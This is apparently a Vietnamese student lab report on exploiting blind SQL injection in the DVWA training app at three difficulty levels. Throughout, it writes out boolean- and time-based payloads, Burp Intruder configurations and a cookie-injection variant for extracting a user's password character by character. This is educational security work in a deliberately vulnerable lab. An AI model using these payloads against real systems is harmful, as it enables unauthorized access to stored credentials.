# BÁO CÁO QUÁ TRÌNH KHAI THÁC BLIND SQL INJECTION (LOW, MEDIUM, HIGH)

---

## 1. BLIND SQL INJECTION (LOW)

Đầu tiên, giao diện xuất hiện một text field cho phép người dùng nhập ID của người dùng:

<img width="1609" height="657" alt="Screenshot 2025-07-16 012222" src="https://github.com/user-attachments/assets/2ea01182-cbb5-401f-875c-b8754c7fe499" />

Nhận thấy khi nhập user ID, server sẽ trả về hai trạng thái là *exists* và *MISSING*:

<img width="1632" height="658" alt="Screenshot 2025-07-16 012834" src="https://github.com/user-attachments/assets/3f4e3621-4ce7-4e28-95e3-d309c1f89ab3" />
<img width="1613" height="674" alt="Screenshot 2025-07-16 012852" src="https://github.com/user-attachments/assets/090d8682-449c-434e-8842-1bcb7a28ffb5" />

&rarr; **Do đó mà ta có thể thử khai thác lỗ hổng Blind SQLi dạng boolean.**

Thực hiện test các payload như bên dưới để kiểm tra SQL injection:

```SQL
 1’ -- -
 1’ and 1=1 -- -
 1’ and 1=0 -- -
```

<img width="1618" height="416" alt="Screenshot 2025-07-16 013159" src="https://github.com/user-attachments/assets/f21a3792-39e7-4eb7-916f-54cc34bf88f7" />
<img width="1617" height="437" alt="Screenshot 2025-07-16 013223" src="https://github.com/user-attachments/assets/7e42fe90-283c-4383-bdaa-bc4681e01ea8" />


Dựa vào lab SQLi, ta biết CSDL có table là users có cột như password và user_id, dựa vào đây ta có thể thực hiện dò đoán thử password của user.

Ta thực hiện tạo các payload dò độ dài của password của user có ID là 1 như sau: 

```SQL
1’ and (SELECT length(password) FROM users WHERE user_id=1) > 1/2/3/4/5…
```

Thực hiện lặp lại cho đến khi độ dài được xác định khi một số trả về *MISSING*, nhưng số liền trước của nó lại trả về *exists*.

Nhận thấy với payload:

```SQL
1’ and (SELECT length(password) FROM users WHERE user_id=1) > 31 -- -
```

Server vẫn trả về exists, nhưng với > 32 thì lại trả về *MISSING*
&rarr; **Do đó có thể kết luận dộ dài của password của user id 1 là 32.**

<img width="1614" height="632" alt="Screenshot 2025-07-16 160722" src="https://github.com/user-attachments/assets/d8c61b09-2211-4d90-962f-de32bb1b1083" />
<img width="1715" height="704" alt="Screenshot 2025-07-16 160752" src="https://github.com/user-attachments/assets/5459f26f-23a2-48a1-82e0-ffa9bbdc816e" />

Thực hiện tạo các payload dò các ký tự trong password của user có ID là 1 như sau: 

```SQL
1’ and (SELECT substring(password,0,1) FROM users WHERE user_id=1)=’a’/’b’/’c’/…
```

Tương tự thực hiện lặp lại nếu đúng ký tự sẽ trả về *exists* còn không là *MISSING*.

Trong đó hàm *substring(password,0,1)* sẽ thực hiện lấy 1 ký tự vị trí 0 của password.

Để thực hiện dò password, ta sử dụng công cụ Intruder ở chế độ Cluster Bomb với hai vị trí cần dò là vị trí cần substring: *substring(password,**0**,1)* và ký tự cần dò.

<img width="1716" height="722" alt="Screenshot 2025-07-16 161037" src="https://github.com/user-attachments/assets/3475b59e-9e81-4eb4-a229-bfdaa6108e4c" />

Trong đó setting vị trí payload 1 như dưới:

<img width="1621" height="786" alt="Screenshot 2025-07-16 161106" src="https://github.com/user-attachments/assets/100e3da8-9d78-4751-9af5-ba847f054dab" />

Trong đó setting vị trí payload 2 như dưới:

<img width="1446" height="766" alt="Screenshot 2025-07-16 161135" src="https://github.com/user-attachments/assets/6e6cfef2-3f4c-4285-971b-9844341db9f4" />

Tạo grep-match như dưới:

<img width="1434" height="606" alt="Screenshot 2025-07-16 161156" src="https://github.com/user-attachments/assets/6460eab9-b609-40a6-ad3e-8d8dad371c76" />

Kết quả sau khi thực hiện brute force dò password:

<img width="1630" height="708" alt="Screenshot 2025-07-16 161223" src="https://github.com/user-attachments/assets/0092c3b0-bcb3-41ec-b3fa-1368cf08b6eb" />

***Note:*** *Em dùng burpsuite bản thường dò lâu quá nên em pass qua phần này ạ.*

---

## 2. BLIND SQL INJECTION (MEDIUM)

Giao diện xuất hiện một select option cho phép người dùng chọn ID của người dùng và gửi:

<img width="1624" height="675" alt="Screenshot 2025-07-16 161440" src="https://github.com/user-attachments/assets/cbafadd0-827e-4194-b056-f79beeba0bf7" />

Dữ liệu id được đưa vào câu truy vấn không đặt trong dấu ‘...’

<img width="1621" height="615" alt="Screenshot 2025-07-16 161508" src="https://github.com/user-attachments/assets/234db71d-4798-465b-80bf-8343a01e102f" />

Sử dụng một cách khai thác lỗ hổng Blind SQLi khác đó dạng dựa trên *time-based*, sử dụng thời gian làm đối trọng.

Khi thực hiện gửi đi payload như sau:  

```SQL
1 or sleep(1) 
```

Ta sẽ thấy server gửi lại phản hồi chậm mất 1s so với thông thường:

<img width="1621" height="680" alt="Screenshot 2025-07-16 161634" src="https://github.com/user-attachments/assets/98f7c58e-d263-4026-9c3b-0c8b8ed010af" />

Tạo payload kết hợp với các truy vấn điều kiện *if*:

```SQL
1 or if (1<2, sleep(1), 0) 
1 or if (1>2, sleep(1), 0)
```

Nếu câu điều kiện thỏa mãn sẽ thực hiện sleep(1), dó đó mà server sẽ phản hồi chậm còn nếu câu điều kiện sai sẽ trả về giá trị 0 và lúc này server sẽ phản hổi ngay:

<img width="1622" height="691" alt="Screenshot 2025-07-16 161753" src="https://github.com/user-attachments/assets/0e12f9ab-523f-47d9-912d-cf3f64ffbf59" />

&rarr; Nhận thấy server phản hồi trong 5s.

<img width="1619" height="687" alt="Screenshot 2025-07-16 161851" src="https://github.com/user-attachments/assets/5f41dcc5-6438-4427-a084-abf03081b54b" />

&rarr; Server phản hồi ngay trong 1s.

Tiếp tục tạo payload sau để dò đoán độ dài của password:


```SQL
1 or IF ((select length(password) from users where user_id=1) > 1/2/3/4/….., SLEEP(1), 0) 
```

<img width="1627" height="666" alt="Screenshot 2025-07-16 162019" src="https://github.com/user-attachments/assets/d4911300-7d97-4d9c-8d44-78fdee0d3cff" />
<img width="1627" height="667" alt="Screenshot 2025-07-16 162032" src="https://github.com/user-attachments/assets/82bcff89-e9b4-4555-82d2-b66cb660ea47" />

&rarr; Kết quả là 32 ký tự.

---

## 3. BLIND SQL INJECTION (HIGH)

Giao diện xuất hiện một link *Click here…*, khi người dùng thực hiện click đường link sẽ xuất hiện một form giao diện cho phép người dùng nhập id và gửi đi:

<img width="1628" height="671" alt="Screenshot 2025-07-16 162143" src="https://github.com/user-attachments/assets/fdf7ac81-0dd7-4156-a0be-a6990f42c8ac" />

Kiểm tra source PHP:

<img width="1624" height="504" alt="Screenshot 2025-07-16 162207" src="https://github.com/user-attachments/assets/f9117195-ec21-49be-812e-917b2fe45f6a" />

&rarr; Ta có thể nhận thấy, giá trị id lúc này được lấy từ cookie của trình duyệt, rồi sử dụng giá trị đó để chèn vào câu lệnh SQL.

Ta có thể thấy điều đó rõ hơn trong hai mẫu request được gửi đi:

<img width="1622" height="470" alt="Screenshot 2025-07-16 162254" src="https://github.com/user-attachments/assets/df9f85d9-aeb3-4d6b-9d37-4f7e0ac78ec2" />
<img width="1622" height="475" alt="Screenshot 2025-07-16 162306" src="https://github.com/user-attachments/assets/f0e07217-9d83-4ddf-be71-1c997d027895" />

Lúc này câu hỏi đặt ra là liệu có thể sửa phần *Cookie: id=...* của request GET để chèn thành payload blind SQLi hay không?

Để kiểm tra, ta tiếp tục thực hiện chèn payload như sau trong id:

```SQL
1’ or if (1<2, sleep(5), 0) -- -
1’ or if (1>2, sleep(5), 0) -- -
```

Nếu tồn tại lỗ hổng SQLi cả hai payload đều sẽ được thực hiện truy vấn, câu 1 sẽ khiến server phản hồi chậm hơn nhiều do hàm sleep(5) được thực thi trong câu điều kiện, ngược lại câu hai sẽ được phản hồi như bình thường.

<img width="1619" height="579" alt="Screenshot 2025-07-16 162441" src="https://github.com/user-attachments/assets/2c516c15-645e-4576-a324-4c8d7690cec2" />
<img width="1619" height="594" alt="Screenshot 2025-07-16 162451" src="https://github.com/user-attachments/assets/fa104453-a318-4ee6-9ab2-d6b94aa8a9f5" />

&rarr; Kết quả cho thấy hệ thống tồn tại SQLi.

Tương tự ta có thể dụng payload để dò đoán độ dài của password: 

```SQL
1’ or IF ((select length(password) from users where user_id=1) > 1/2/3/4/…, SLEEP(1), 0) -- -
```

<img width="1624" height="607" alt="Screenshot 2025-07-16 162742" src="https://github.com/user-attachments/assets/4e1f5e5e-6b3f-4c70-ac26-65c1a71bbfae" />
<img width="1628" height="607" alt="Screenshot 2025-07-16 162755" src="https://github.com/user-attachments/assets/4260f2e8-e54c-4c5c-951a-cc18d3d267af" />

&rarr; Kết quả tương tụ có 32 ký tư.

Tiếp tục ta có thể tạo payload để thực hiện dò các ký tự trong password của user có id là 1:

```SQL
1' or if ((select substring(password,1,1) from users where user_id=1)=’a’/'b'/’c’/…, sleep(5), 0) -- -
```

Trong công cụ Intruder ta cấu hình như sau:

```SQL
1' or if ((select substring(password,§1§,1) from users where user_id=1)='§a§', sleep(5), 0) -- -
```

<img width="1682" height="707" alt="Screenshot 2025-07-16 162954" src="https://github.com/user-attachments/assets/c94499d8-a24b-4aad-b4f2-98a3ee82c772" />
<img width="1350" height="832" alt="Screenshot 2025-07-16 163019" src="https://github.com/user-attachments/assets/5f219f67-fe1a-40e1-860f-6548d571da6a" />
<img width="1357" height="712" alt="Screenshot 2025-07-16 163034" src="https://github.com/user-attachments/assets/9f381a8d-7a1e-41ee-996a-25a2e84fae35" />

Kết quả sau khi thực hiện tấn công, ta có thể thấy những request có phản hồi chậm hơn so với các request khác đúng ký tự tương ứng với vị trí trong password của người dùng id 1:

<img width="1356" height="516" alt="Screenshot 2025-07-16 163105" src="https://github.com/user-attachments/assets/9ce2bd05-b1f0-4f75-bd69-e190222da056" />

---

## ✅ Kết luận:

Thành công khai thác lỗ hổng Blind SQLi trên lab DVWA.

---

